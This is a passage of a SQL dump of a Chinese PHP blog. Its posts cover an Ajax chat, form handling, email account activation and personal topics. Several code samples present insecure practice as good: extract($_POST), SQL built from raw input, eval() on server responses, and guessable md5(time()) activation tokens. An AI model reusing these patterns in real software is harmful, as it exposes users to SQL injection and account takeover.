mysql_close($this-&gt;conn);<br />   }<br /> }</p></PRE><P>用类来做sql相关操作是挺不错的选择，因为它能调用构造与析构函数来完成连接数据库与释放的操作，很方便，当然啦，如果习惯用function的话也可以写好几个function来处理sql的操作，就看自己而定了。 </p>\r\n<P>就这样前台显示友情链接的功能就over了，当然啦，还需要有添加友情链接的功能，还有修改友情链接的功能才行，而我就说到这里吧，添加与修改功能实现起来差不多，当然也有不少差别，改天有空再补上吧。</p></p>', 2, 1, 857, 0, 0, 0, 1257177600, 0),
(5, 'Ajax实现网页聊天', 'ajax-webicq', 3, '<P>曾几何时自己想用vc++编一个局域网内的聊天工具，可惜一直没有实现……而自己也渐渐走向了网站开发这条路上来了。</p><P>我有时候也会想去在一个网页上进行在线聊天的功能，但是如果将一个页分为不同框架去弄的话，效果很不理想（因为如果要实现不停地更新聊天内容需要使某个框架不停地刷新，这样使得整个网页很不爽…），而且弄起来也不太顺手，而终于是Ajax解救了我。<br /> <br />自己实现的时候就涉及到三个文件，一个是html的，一个是php的，一个js的，当然也需要数据库的支持。</p>\r\n<P>界面并没有太好地经过美化，只是用css突出以下内容与IP地址。<br /><a href="http://localhost/paperenblog/file/3" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/3" alt="201001201263960839" title="上传于2010-01-20"></a></p><!--more-->\r\n<P><br />代码我就不可能在这里全部都贴出来了……说说自己在弄的过程中一些比较关键的地方罢了。<br /> <br />1.需要实现随时更新聊天内容<br />2.需要将提交的message通过ajax插入到数据库<br />3.处理编码的问题，一开始这个弄得自己比较头疼，之后Google了不少才终于解决问题<br /> <br />说到底就是要实现数据的输入输出的两个重要环节而已，当然你可以在这个基础上添加登录功能与房间功能，还有在线人列表等等……（想起来还是大有搞头的）<br /></p>\r\n<P>（09-12-14 补充：其实现在Paperen自己再看回这篇文章时，确实觉得如果使用我下面说的方法调用AJAX的话那也忒麻烦了点……应该说这种原始的js架构写起来代码很多，以后有机会Paperen会说下用JQuery调用AJAX这种简单而实在的方法）</p><P>对于数据的输入，当点击“发表”按钮后就激发一个js函数将数据通过ajax采用post的方式传送到一个php页进行处理并插入数据库，而聊天内容的不断更新则要定义一个js函数使用ajax不停地往那个php页提取数据 <br /></p><PRE>ajax.js 部分代码：<br />function message()<br />{<br /> setInterval("get();",100); //0.1秒就调用get函数<br />}</PRE>当然这个message函数直接放在body后面的onload中就行了。而对于get函数，很明显是需要createXMLHttpRequest()创建一个XMLHttpRequest的对象。 <br /><PRE>function get()<br />{<br /> createXMLHttpRequest();<br /> var url,timetmp;<br /> timetmp=new Date().getTime();<br /> url="test.php?tmp="+timetmp;<br />/*这里的timetmp也是个key point，如果没有这个的话，聊天的内容在某些浏览器中就会就更新不出来了，这里还是引用一下权威的解析吧――《深入浅出ajax》书中是这么形容的“给url添加一个时间戳，这个时间戳使得每次访问的URL都不同。这样对与某些浏览器（如IE），就不会产生浏览器对同一个网址进行缓存，从而不会出现页面不能更新的现象”。*/<br /> xmlHttp.open("GET",url,true);//使用GET的方式<br /> xmlHttp.onreadystatechange=show;//状态的改变由自定义的show函数进行处理<br /> xmlHttp.send(null);<br />}<br /> <br />function show()<br />{<br /> if(xmlHttp.readyState==4)<br /> {<br />  if(xmlHttp.status==200)<br />  {<br />   var message=eval(′(′+xmlHttp.responseText+′)′);//这里进行这步的原理自己也没搞懂，也是从《PHP5高级应用开发实践》书中ajax那节谈到的，作者叫我相信他这样做是对的，所以我照做了，结果也证明了他是对的（不然他也不会写在书里啦……返回的数据是使用json_encode()加工过的）<br />   var txt="";<br />   for(i=0;i  {<br />    txt+=message[i].ip+"  说："+message[i].message+"  "+message[i].time;//这没什么可说的，构造一个html结构显示数据而已，随意发挥就行<br />   }<br />   document.getElementById("return").innerHTML=txt;<br />  }<br /> } <br />}</PRE>以上是处理接收数据的js函数，对于点击发表按钮后调用的主要函数 <br /><PRE>function talk()<br />{<br /> createXMLHttpRequest();<br /> var url;<br /> url="test.php";//定义URL<br /> var poststr;<br /> poststr="message="+encodeURI(document.getElementById("message").value);//定义post的数据,关键要用encodeURI对数据进行处理<br /> xmlHttp.open("POST",url,true);//方式为POST<br /> xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");//定义数据头部<br /> xmlHttp.send(poststr);//发送数据<br /> xmlHttp.onreadystatechange=result;//状态变化后交给函数result处理<br />}</PRE><P>result函数就不说了很简单，就是判断发送是否成功而已。<br />test.php的部分代码：<br />header("Content-Type:text/html;charset=GBK");//这个是必须的，定义这个页的编码是gbk，不然又会出乱子<br />我用了if(isset($_POST["message"])){}else{}进行判断目前的操作是数据的接收还是输出<br /> <br />对于数据的输出：<br />先定义sql语句啦$sql="select * from message order by date Desc";<br />再送入mysql--$result=query($sql);//query是一个自定义函数，参数就是sql语句，返回的是$result;自己习惯了这样用，挺方便的 ^_^，当然你可以选择定义一个class来处理sql相关的操作，看你习惯而定了。<br />要判断一下是否存在数据吧，<br /></p><PRE>if(mysql_num_rows($result)==0){echo "没有任何信息<br />"; }<br />else<br />  {<br />   $sendmessage[]=array();//定义一个容器用于放数据<br />   $i=0;//定义数组的下标key<br />   while(list($ip,$message,$time)=mysql_fetch_array($result))<br />   {<br />    $sendmessage[$i]=array(′ip′=&gt;$ip,′message′=&gt;iconv(′gbk′,′utf-8′,$message),′time′=&gt;$time);//将$message的数据进行转化为utf-8的编码<br />    $i++;<br />   }<br />   echo json_encode($sendmessage);//最后用 json_encode处理一下数据<br />  }</PRE> <br />这里你可以直接在test.php页中进行测试，不加参数就是了http://192.168.1.16/ajax/test.php，我这里会直接输出经过json_encode处理的数据<br /><PRE>[{"ip":"192.168.1.16","message":"u518du770bu770b","time":"09-10-24 15:51:42"},{"ip":"192.168.1.16","message":"u7f16u7801u7684u95eeu9898u771fu662fu633au5565u7684","time":"09-10-24 15:32:44"},{"ip":"192.168.1.16","message":"123","time":"09-10-24 15:22:47"}] </PRE><P>u7f16u7801u7684u95eeu9898u771fu662fu633au5565u7684这个并不是乱码，而是字符串gbk转化为了utf-8的形式了，在经过ajax.js的show函数处理后就好了。<br /> <br />mysql_query("SET NAMES ′GBK′");//定义送入mysql的编码<br />$message=mysql_escape_string(iconv("UTF-8","GBK",$_POST["message"]));//将数据从utf-8转为gbk再经过mysql_escape_string处理才送入数据库<br /> <br />而对与处理输入（其实没啥好说的，就是sql语句呗）<br /></p><PRE>$message=mysql_escape_string(iconv("UTF-8","GBK",$_POST["message"]));//这个也是keypoint喔<br />$ip=$_SERVER[′REMOTE_ADDR′];<br />$time=date("y-m-d H:i:s",time());<br />$sql="insert into message (name,message,date) values(′$ip′,′$message′,′$time′)";<br />query($sql);</PRE><P>实现一个功能其实并不困难但是也绝对不是件简单的事情（特别是那个编码问题也曾经弄得自己比较郁闷幸好有google的帮助），但自己还是很回味实现功能后的那种感觉，好有成就感。<br /> <br />其实这个功能还大有搞头，我还在考虑要不要把它当为毕业设计算了，不过这里它还是相当相当之简陋的，而且可能也存在着一些不足，特别是对于数据的输出部分，因为每次输出都要将以前所有的聊天数据全部输出，我又在想能不能设计成每当有聊天记录增加时才需要与test.php文件进行交流而不是每隔0.1秒就交流一次，这有点浪费。<br /> <br />参考URL：<br />编码的问题：<br /><A href="http://www.feel123.cn/ajax/20080423/277.html">http://www.feel123.cn/ajax/20080423/277.html</A><br /><A href="http://www.4wei.cn/?p=1000235">http://www.4wei.cn/?p=1000235</A><br />ajax post数据:<A href="http://blog.csdn.net/wangdetian168/archive/2007/05/10/1602966.aspx">http://blog.csdn.net/wangdetian168/archive/2007/05/10/1602966.aspx</A> </p>\r\n\r\n<P>Jquery Ajax:<A href="http://www.cnblogs.com/QLeelulu/archive/2008/04/21/1163021.html">http://www.cnblogs.com/QLeelulu/archive/2008/04/21/1163021.html</A><br /> </p></p>', 2, 1, 1032, 0, 0, 0, 1257436800, 0),
(6, '接收表单数据', 'get-the-form-data', 2, '<FONT face="宋体">\r\n</FONT><P>那天paperen在工作时修改别人写的代码，在看到添加文本时使用的新浪那个编辑器时，才接触到extract这个函数，终于解决了一直以来对接收表单数据的麻烦问题，也许是我以前没充分看php的函数吧……</p>\r\n<P>想想以前自己是怎样接收表单的数据的，一个表单的html结构</p><PRE>&lt;form action="test.php" method="post"&gt;<br />&lt;P&gt;&lt;label for="name"&gt;名字:&lt;/label&gt;&lt;input type="text" name="name" id="name" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="email"&gt;email:&lt;/label&gt;&lt;input type="text" name="email" id="email" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="phone"&gt;电话:&lt;/label&gt;&lt;input type="text" name="phone" id="phone" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="qq"&gt;QQ:&lt;/label&gt;&lt;input type="text" name="qq" id="qq" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;input type="submit" name="submit" id="submit" value="提交" /&gt;&lt;/p&gt;<br />&lt;/from&gt;<br /></PRE><P>当我们一点击提交时，整个表单就会提交到 action指定的文件处理，这里会将form的数据提交到test.php页面进行处理，但你当然可以提交给本页处理，那么你可以不用写action这个属性，不过要确保这个文件也是一个php文件才行。(稍微说下method这个定义数据以什么形式发送，一般有GET与POST两种方法，这里就不具体说这两种方法的区别了，自己可以(Google)</p><!--more-->\r\n<P>我以前接收数据都是这样处理的（可能是asp养成的习惯）</p>\r\n<P>方法一：<br /></p><PRE>if(isset($_POST[′submit′]))<br />{<br />$name=$_POST[′name′];<br />$email=$_POST[′email′];<br />$phone=$_POST[′phone′];<br />$qq=$_POST[′qq′];<br />}</PRE><P>之后再组合sql语句?</p>\r\n<PRE>$sql="insert into table (name,email,phone,qq) values (′$name′,′$email′,′$phone′,′$qq′)";?</PRE><P>或者你会想为什么不直接将$_POST[′name′]这些直接放在$sql中?</p>\r\n<PRE>$sql="insert into table (name,email,phone,qq) values (′$_POST[′name′]′,′$_POST[′email′]′,′$_POST[′phone′]′,′$_POST[′qq′]′)";?</PRE><P>但是你可以试试，这样php是认不出这里的变量值的，它只把values (′$_POST[′name′]′,′$_POST[′email′]′,′$_POST[′phone′]′,′$_POST[′qq′]′)";当成了一些字符串而不是指接收到的数据。</p>\r\n<P>当然放到一个变量里也是有利于进行一些过滤处理的，因为直接将$_POST[′name′]这些数据直接送入数据库进行处理是不安全的，不建议这样做。</p>\r\n<P>将话题转回这种接收数据的方法本身，可以想象得到的如果表单的数据很多，那么岂不是要写很多这些$name=$_POST[′name′];并定义了一系列变量，那多麻烦。</p>\r\n<P>所以之后我又尝试了其他方法，在php中支持在表单端用数组装入数据。</p>\r\n<P>方法二：</p><P><PRE>&lt;form action="test.php" method="post"&gt;<br />&lt;P&gt;&lt;label for="name"&gt;名字:&lt;/label&gt;&lt;input type="text" name="data[name]" id="name" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="email"&gt;email:&lt;/label&gt;&lt;input type="text" name="data[email]" id="email" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="phone"&gt;电话:&lt;/label&gt;&lt;input type="text" name="date[phone]" id="phone" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="qq"&gt;QQ:&lt;/label&gt;&lt;input type="text" name="data[qq]" id="qq" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;input type="submit" name="submit" id="submit" value="提交" /&gt;&lt;/p&gt;<br />&lt;/from&gt;<br /></PRE><P></p>\r\n<P>将name写成数组形式，那么在接收时可以使用foreach进行数据的分割与处理了。</p>\r\n<P>foreach($data as $key=&gt;$value){echo $key."=".$value."<br />";}试试看能不能得到我想得到的数据。这里除了把当前元素的值赋给$value外，当前元素的键值也会在每次循环中被赋给变量$key。键值可以是下标值，也可以是字符串</p>\r\n<P>然后我们构造sql语句。先想象一下我们应该构造的sql语句：insert into table (name,email,phone,qq) values (′$name′,′$email′,′$phone′,′$qq′);很明显我们要构造两个字符串,一是(name,email,phone,qq)，二是(′$name′,′$email′,′$phone′,′$qq′)?</p>\r\n<PRE>if(isset($_POST[′submit′]))<br />{<br />?$txt0=$txt1="";<br />?foreach($data as $key=&gt;$value)<br />?{<br />? $txt0.=",".$key;<br />? $txt1.=",′".$value."′";<br />?}<br />}\r\n<P><br />//去掉前面多余的逗号<br />$txt0=substr($txt0,1);<br />$txt1=substr($txt1,1);<br />//组合字符串<br />$sql="insert into ($txt0) values ($txt1)";</pre></p><P>最后总结一下这种接收数据的方法，不需要手动定义一个与post数据相关的变量了，我们接收端的程序不需要去记住数据的name是什么，但是必须确保表单处的name与构造的数据表中的字段是一样的，处理主要专注于字符串处理部分，使用了foreach与substr函数进行处理，组成我们想要的sql语句。很明显比第一种方法更好。</p>\r\n<P>最方便的方法,extract 方法三：</p>\r\n<P>超级方便的方法,表单的结构与方法一的一样。</p>\r\n<P><PRE>&lt;form action="test.php" method="post"&gt;<br />&lt;P&gt;&lt;label for="name"&gt;名字:&lt;/label&gt;&lt;input type="text" name="name" id="name" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="email"&gt;email:&lt;/label&gt;&lt;input type="text" name="email" id="email" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="phone"&gt;电话:&lt;/label&gt;&lt;input type="text" name="phone" id="phone" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;label for="qq"&gt;QQ:&lt;/label&gt;&lt;input type="text" name="qq" id="qq" /&gt;&lt;/p&gt;<br />&lt;P&gt;&lt;input type="submit" name="submit" id="submit" value="提交" /&gt;&lt;/p&gt;<br />&lt;/from&gt; </pre></p><p>在接收时</p><p><PRE>if(isset($_POST[′submit′]))<br />{<br />?extract($_POST);<br />?$sql="insert into table (name,email,phone,qq) values (′$name′,′$email′,′$phone′,′$qq′)";<br />?//这就OVER了，是不是觉得有点太神奇<br />}</PRE></p><P>\r\n下面贴一下extract函数的在php手册中解析extract ― Import variables into the current symbol table from an array</p><P>详细可以看这里：<a href="http://docs.php.net/manual/en/function.extract.php" target="_blank">http://docs.php.net/manual/en/function.extract.php</a></p><P>将数组中的变量转化为当前变量（自己翻译的……应该不是很准，paperen我英语只过了四级……）extract($_POST)将POST中的数据转化为现在当前变量，其实$_POST也是一个数组，不信的话，大家可以用print_r($_POST)看看结果。</p><P>当使用完这个函数后我们就可以直接使用键值为相应的变量了$name,$email,$phone,$qq,$submit。</p><P>怎样php强大吧，不知不觉又想到以前用asp时候处理这种大表单时的痛苦……asp中不支持第二种方法也没有extract这个函数……只能乖乖地用第一种方法吧，或者有其他方法吧，也许是paperen我见识看少了点吧，如果某位大侠知道还有其他简单的方法，也给大家分享分享吧。</p><P>以上所有函数大家可以到<a href="http://docs.php.net/manual/zh/manual.php" target="_blank">http://docs.php.net/manual/zh/manual.php</a>查询</p></PRE></PRE></p>', 2, 1, 978, 0, 0, 0, 1257609600, 0),
(7, '写给26岁的自己', 'write-to-26', 1, '<P><FONT face=宋体>今天上班的时候突然看到遨游状态栏显示的一条信息，“26岁的时候，他们都干了些什么”，自己不知不觉就点击去看看了，列了很多伟人们26岁时候的成就，关掉页面，自己脑子也停了下来，是不是paperen我也得要想想26岁的我应该要获得什么呢？要到达哪里呢？要成为一个怎样的人？不自觉地自己的思绪就离开了当前手上的工作……</FONT></p>\r\n<P><FONT face=宋体>1.26岁的我依然要有始有终</FONT></p>\r\n<P><FONT face=宋体>确实的说，自己在这家网站公司上班不到一个星期，但是这些天来自己想到了确实许多，关于工作，职业，自己还有别人的，在公司中自己现在算是一个php程序员，但是暂没有接到任何新的客户单子，我一直都在改，改前一个php程序员写的烂代码，那些连isset($_GET[′id′])都不会写的代码，那些错漏百出的代码，那些写得乱七八糟的代码，而且我很奇怪的是这样的代码这样写出来的网站客户用起来的时候就没发现，还让他手尾都不用改的情况下就溜了，我虽然不知道是什么个情况，但是我觉得做程序的怎也得有个始也要有个终，我在这里就不发泄太多了，确实的来说觉得26岁的我一定要有始有终，虽然大家只注重网站的效果，但是我们写程序的不能对不起自己更不能对不起客户。</FONT></p><!--more-->\r\n<P><FONT face=宋体>2.26岁的我依然保持自己的兴趣</FONT></p>\r\n<P><FONT face=宋体>我一直觉得web开发是自己很感兴趣的事情，没错，的确是那样的，但是社会总是残酷的，工作总是让你只能专注于一方面，要么你是程序员要么是搞设计，甚至更细，因为公司追求效率而不是注重你的兴趣，公司是注重你带给他的利益而不是为了培育你（至少我目前是这么认为的），如果你认为公司能培育你，那么你将会大错特错，自己当然有追求自己兴趣的自由，但是我觉得当你工作后就不是那么一回事了，你可能会渐渐麻木，甚至忘记了兴趣的本身，这的确是件很悲哀的事情，所以我决定不能让自己对web开发的兴趣在这种麻木的工作中被磨光。</FONT></p>\r\n<P><FONT face=宋体>3.26岁的我依然坚持将懒吧的网站续下去</FONT></p>\r\n<P><FONT face=宋体>09年的三月份，吴思他们邀请我进入了他们的团队，打算建设一个面向本校区的大学生买卖网站，之后我们取名为懒吧，自己一直在大家的压力下不断地努力，不断地坚持，经过无数次整改终于成型，在压力下成长的确是最快的，而自己从这次经历中获得的经验也是不计其数的，我一直很感谢他们给我这样一个机会去参与到他们之中，虽然最后最后他们还是放弃了，虽然我也很伤心，但是我也不会埋怨什么，的确自己想去坚持下去，但是光靠我一个人实在是没法坚持，因为我除去了技术的知识其他的都不会。我知道没有团队等于失败，所以我被迫去放弃懒吧。但是我还继续整改懒吧，asp+access的平台，我觉得它就是自己大学生涯中唯一一件值得自己骄傲的事情，所以我要将懒吧的空间续下去，包括域名。</FONT></p>\r\n<P><FONT face=宋体>4.26岁的我依然保持我的生活态度</FONT></p>\r\n<P><FONT face=宋体>虽然不知道自己以后能不能找到一份好工作，但是paperen我还是希望自己保持自己的生活态度，我不喜欢整天奔波在外的生活，不喜欢曲折离奇的生活，我喜欢掌握自己的生活节奏，聆听自己的心声，而不是去违背，我承认自己在交友与交际上不太行，但是我认为熟悉我的朋友们不会觉得我是一个无情与独来独往的人。我不喜欢在公司刻意去做作什么，不喜欢为了权力刻意去奉承什么，我只要做好我自己，这就是我的生活态度。</FONT></p>\r\n<P><FONT face=宋体>5.26岁的我依然要保持现在的体型</FONT></p>\r\n<P><FONT face=宋体>这个或许是件比较难的事情，因为现在paperen我也很少运动了，不像大一大二的时候有空就去球场踢波，但是我不知道以后自己还有没有空去运动了，自己挺喜欢自己现在的体型的，我才不想变成那种啤酒肚那种……看起来就不爽（别误会，我并没有鄙视某些人，只是鄙视如果自己的体型是那样的话）。</FONT></p>\r\n<P><FONT face=宋体>如果26岁那时自己还能做到上面这五点也就算很不错了吧。</FONT></p>\r\n<P><FONT face=宋体>26岁的自己会成为怎样，我会努力的，Be the one i will be。</FONT></p></p>', 2, 1, 1121, 1, 0, 0, 1258128000, 0),
(17, '最近听上One Republic', 'one-republic', 4, '<P>paperen是从stop and stare这首歌开始接触上这个乐队的，stop and stare这首歌给我的感觉真的很不错，不知道怎表述，关于音乐的风格的名词paperen我了解得很少，反正就是喜欢这首歌，而且歌词也很很好，令人回味，这首歌的mtv也很好看，虽然papern还是不太能理解这首歌的意思，或者根本不需要去理解，有这个意境就已经足够了，如果大家有兴趣的话，可以自己去看看歌词，真的写的很好。 </p>\r\n<P>之后开始听他们的专辑，发觉越来越来不错，每首歌的风格都很独特，而且歌词都很不错，而目前one republic就出了两张专辑，paperen我都很喜欢听。 </p>\r\n<P>stop and stare的MTV <A href="http://v.youku.com/v_show/id_XMzM3MjkyNjA=.html">http://v.youku.com/v_show/id_XMzM3MjkyNjA=.html</A></p><!--more--></p>', 2, 1, 1176, 0, 0, 0, 1261884490, 0),
(18, '怎样提高php水平？', 'improve-php-skill', 2, '<P>对于这个题目其实paperen我也一直在思考，某个时期自己也经常会迷惑，到底怎样去提高自己的水平呢？！paperen自己那时也google过，百度过，但是大致说的都是一样的，要多写代码多练，多看。其实现在的paperen也不是很强，至少连框架到底是什么东西都还不是很清楚，前些天也看了看thinkphp，但是还没有钻研彻底。 </p>\r\n<P>而再前些日子paperen我也不停地看别人的代码，WordPress，phpcms，dede等等一些开源的php，但是越看越乱，感觉是没搞清他们写的思路，不过确实也领会了不少东西，至少将他们开发的模式弄懂了一些，文件基本都差不多，一般都是require一个配置全局的文件，然后定义很多常量，之后是类，函数，缓存等等。paperen我现在也是这样进行程序的编写的，因为确实是方便，虽然文件分的比较多但是思路却很清晰。 </p>\r\n<P>都说用框架开发比较快，但是paperen我到目前为止还没用过框架来进行开发，不知道自己这个算不算是一个框架…这几天也帮别人写了个博客程序，不过功能没自己的强，但是感觉帮他写的后台比自己这个后台还要好看并且舒服…不过这也是件好事，证明自己的水平渐长了点。 </p><!--more-->\r\n<P>paperen我的php年龄还不到一年，是从今年暑假开始接触php的，但是之前因为有了asp的基础所以上手比较快，但还是如网上说的那样，需要多练多写程序才行啊，还有个人意见--还要全面，一开作为一个web开发者确实需要了解很多东西，包括html，Css，JavaScript，sql甚至Jquery，Ajax等等，但是不要被吓倒，一步一步就好了，你要知道的是即使你喜欢写php程序但是也不能离开html，也不能不知道其他的知识，你需要去了解全部的知识但是不一定要全精通。 </p>\r\n<P>paperen我还记得在海奇那次面试，不知不觉间说了句自己是全能的，现在说起来自己都觉得很寒…但是自己那时候确实是想到那么一句了，因为paperen在弄懒吧的时候不但要负责前台的美工设计，还要进行代码的编写，基本上说是一个人负责整站的建设，虽然“全能”这个形容确实夸张，但是我找不到别的词来形容自己在弄懒吧时的状况了，至少paperen我没说“全精”… </p>\r\n<P>关键在于兴趣吧，还是那样说，宿舍一个宿友前段时间也说要学php但是也不到两天的劲就退了，他没有兴趣，如果问我php进步的原因，paperen我会说兴趣占了百分之四十，百分之四十是练习，百分之二十是坚持。当你到达一定高度的时候也一定会问怎去提高水平，paperen觉得那时候还是继续应该回去看别人写的代码，继续去了解别人的思路，从中获得自己以前想不到的东西，然后用于以后的程序编写并发展自己的程序特色。 </p>\r\n<P>近来paperen我虽说是将实习退了，但也不见得又多空闲，应付学院的实习报告，还有帮别人写了个博客，当然还有考试，转眼就过了一周，唉，感觉时间还是过得很快，还说要整改懒吧，似乎还需要一段时间啊~~paperen我也得给自己充充电，看看JavaScript方面的书还有jquery，再回头去看看WordPress等几个开源的php代码，还有研究一下框架，也就是近段时间自己的计划了。 </p>\r\n<P>总之，paperen个人觉得--不是怕你菜而是怕你坚持不下去，虽然不知道对各位phper们自己说的这些有没有帮助，但paperen我也很欢迎与大家的进行交流。</p></p>', 2, 1, 1081, 0, 0, 0, 1261969516, 0),
(19, '邮件激活账号功能', 'active-via-email', 2, '<P><FONT face="宋体">前几天小白让我看看怎样去实现邮件激活账号的功能，对于一些大型的论坛或网站注册一般都会这样做的啦，用来防止某些人乱注册的情况，一开始paperen我就有个思路，就是在用户注册时，生成</FONT><FONT face="宋体">一个随机的数列同时放入到数据库中（自己就想到用MD5），然后调用mail函数向注册的邮箱发一封邮件</FONT><FONT face="宋体">，里面装着一个地址（如example.php?rand=f3223d2d32d&amp;id=12）刚才实现了下，看来paperen我</FONT><FONT face="宋体">的思路是可行的。下面来具体说一下是到底怎实现的吧。</FONT> </p>\r\n<P><FONT face="宋体">首先从基本开始吧，对于注册页面肯定就是一个form啦</FONT></p><P><PRE>&lt;form method="post" action="reg.php"&gt;<br /> &lt;p&gt;Name:&lt;input type="text" name="name" /&gt;&lt;/p&gt;<br /> &lt;p&gt;Email:&lt;input type="text" name="email" /&gt;&lt;/p&gt;<br /> &lt;p&gt;Password:&lt;input type="password" name="pwd" /&gt;&lt;/p&gt;<br /> &lt;p&gt;&lt;input type="submit" name="submit" value="Reg Now" /&gt;&lt;/p&gt;<br />&lt;/form&gt;<br /></PRE><P></p><!--more--><P>用来装注册的数据，名字，邮箱，密码，你还可以加进验证码，paperen我这里就略掉验证码吧，因为不是重点。这个form传到reg.php页处理。与平常接收表单的数据没什么区别，不过这里我们需要扩展一个表，这个表的字段基本上与正式会员的字段差不多，但是多了两个字段，一个是用来装随机字符串(rand)，一个是判断是否已经激活(member)，用来装这些数据，而不是直接放入正式会员的表中，paperen我觉得这样子比较好一点，不会使正式验证的会员那个表太杂了，并且生成一个随机字符串，paperen我这里使用了MD5，不过我们可以去实现更可怕的加密函数，自制一个也行，也不会很难，就是abcd26个英文字母加上1234数字甚至加上+-*%等特殊符号，这样会增加保密性，而个人觉得用MD5应该足够了。 </p><PRE><P><FONT face="宋体">$name=mysql_escape_string($name);<br />$pwd=md5($pwd);//别忘了给密码也加密一下<br />$rand=substr(md5(time()),0,16);//这个就是随机字符串<br />$sql="insert into member (`name`,`email`,`rand`) values (''$name'',''$email'',''$rand'')";</FONT></p><P><FONT face="宋体">$db=new sql();//sql为自己定义的一个用于操作数据库的一个类<br />$db-&gt;query($sql);<br />$id=$db-&gt;get_insertid();//获得刚才插入数据的id</FONT></p><P><FONT face="宋体">sendmail();//给他发个邮件吧,让他激活账号</FONT></p></PRE><P>而对于邮件也可以是html形式的，大家应该有体会吧，而如果你想发送是html形式的邮件注意要在使用mail函数时加进头信息，对于mail函数大家可以参考 </p>\r\n<P><FONT face="宋体"><A href="http://docs.php.net/manual/en/function.mail.php">http://docs.php.net/manual/en/function.mail.php</A></FONT> </p>\r\n<P>手册的例子已经说得很详细了。 </p><PRE><P><FONT face="宋体">$headers=''MIME-Version: 1.0''. "rn";<br />$headers.=''Content-type: text/html; charset=utf-8''."rn";</FONT></p></PRE><P>再来构造一个html页面吧，为了使邮件好看点吧，代码这里就不贴了，就是一个很简单的页面，里面有一个超链接，href属性为<FONT face="宋体">，为什么写成这样，因为这个href是动态的，而具体怎实现请看下文。</FONT> </p>\r\n<P><a href="http://localhost/paperenblog/file/4" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/4" alt="200912311262252915" title="上传于2009-12-31"></a> </p>\r\n<P>我将这个html页面保存为后缀是tpl的，好像保存为是什么格式的都不要紧。 </p>\r\n<P>再贴出sendmail这个函数的代码。</p><PRE><P><FONT face="宋体">function sendmail(){<br />  $url="http://iamlze.cn/email/finish.php?id=".$GLOBALS[''id'']."&amp;rand=".$GLOBALS[''rand''];//这个就是那个url变量了，使用global全局变量来获取随机字符串与id号<br />  ob_start();//启动缓冲<br />  require_once("email/email.tpl");//引入刚才那个后缀叫tpl的html页面<br />  $message=ob_get_contents();//获得缓冲的所有内容并放在一个变量中<br />  ob_end_clean();//清空缓冲<br />  $from="iamlze.cn";<br />  $subject="Welcome to paperen''s blog";<br />  $headers=''MIME-Version: 1.0''. "rn";<br />  $headers.=''Content-type: text/html; charset=utf-8''."rn";<br />  $headers.="To:,".$GLOBALS[''email'']."rn";<br />  $headers.="From:".$from."rn";<br />  mail($GLOBALS[''email''],$subject,$message,$headers);//发送邮件<br />  return true;<br /> }</FONT></p></PRE><P>对于ob_start()与ob_get_contents()这几个函数也是经常用于生成静态页的技术中的，比较神奇的函数。相关资料大家都可以去查查php手册。 </p>\r\n<P>经过ob_start()然后require后，$url变量就会放到tpl那个的超链接的href中去了，然后再所有内容放到一个叫$message的变量中，之后进行一些很基本的参数设置后直接调用mail发送邮件吧。 </p>\r\n<P>然后到自己的邮箱看看吧</p>\r\n<P><a href="http://localhost/paperenblog/file/5" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/5" alt="200912311262253888" title="上传于2009-12-31"></a> </p>\r\n<P>点击here超链接跳到<FONT face="宋体">finish.php页确定激活就ok了。对于<FONT face="宋体">finish.php的代码如下。</FONT></FONT></p><PRE><P><FONT face="宋体">if(isset($id) &amp;&amp; isset($rand)){<br />  $id=mysql_escape_string($id);<br />  $rand=mysql_escape_string($rand);<br />  $sql="select * from member where id=''$id'' and rand=''$rand'' and member=''0''";<br />  $db=new sql();<br />  if($db-&gt;query($sql)){<br />   $sql="update `member` set member=1 where id=''$id''";<br />   $db-&gt;query($sql);<br />   echo "finish";<br />  }else{<br />   echo "error";<br />  }<br />  unset($db);<br /> }</FONT></p></PRE><P>就是获取get的参数并检查，满足条件后就将表中的member字段设置为1，就是是表名完成激活了，而这里也需要将激活后的数据插入正式的会员表中，paperen这里就省略了这部分，但是这个功能还有许多地方需要完善才能更好，很明显你可以看出我写的代码很多地方不太合理，所以就得好好完善一下，将功能进行整合并封装，使这个功能能更好的与整站代码结合。</p></p>', 2, 1, 1477, 1, 0, 0, 1262254660, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(8, 'json的使用', 'use-json', 2, '<P>不知道看到这个标题的大家会觉得这里的json是指什么，貌似是一个人的名字，但是这里加上使用就肯定不是指某个人啦。 </p>\r\n<P>我也稍微地说一下json，JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。不知道大家有没有接触过或者用过xml来传输数据，而json的作用与xml是一样的，作为数据传送的一种格式，后起之秀。Paperen我是先用上了json的，当初是在一本叫《PHP.5.高级应用开发实践》的书中看到过json的使用，而xml自己目前还没有在实际中用过。 </p>\r\n<P>对于json大家可以访问一下站点：</p><!--more-->\r\n<P><A href="http://baike.baidu.com/view/136475.htm">http://baike.baidu.com/view/136475.htm</A></p>\r\n<P><A href="http://www.json.org/json-zh.html">http://www.json.org/json-zh.html</A> 